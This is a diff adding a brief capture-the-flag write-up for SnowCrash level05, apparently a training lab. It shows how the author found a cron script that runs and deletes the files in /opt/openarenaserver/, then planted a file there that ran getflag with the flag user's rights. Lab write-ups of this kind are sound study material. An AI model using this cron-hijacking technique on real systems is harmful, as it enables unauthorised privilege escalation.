@@ -1,0 +1,27 @@
+if I go to the root and execute the command (ls -lR 2>/dev/null | grep flag05)
+it will give me this
+level05@SnowCrash:/$ ls -lR 2>/dev/null | grep flag05
+-rwxr-x--- 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+
+using whereis I will find the file
+level05@SnowCrash:/$ whereis openarenaserver
+openarenaserver: /usr/sbin/openarenaserver
+
+then I tried to see what does it include
+level05@SnowCrash:/usr/sbin$ cat openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+I found that it is a cronjob that runs this script, and this script works by executing all the scripts inside the folder /opt/openarenaserver/ and then deletes them
+so I thought of adding a file inside /opt/openarenaserver/ that includes the following:
+getflag > /tmp/test
+
+then I waited until it got deleted to make sure that it got executed
+
+cat test
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
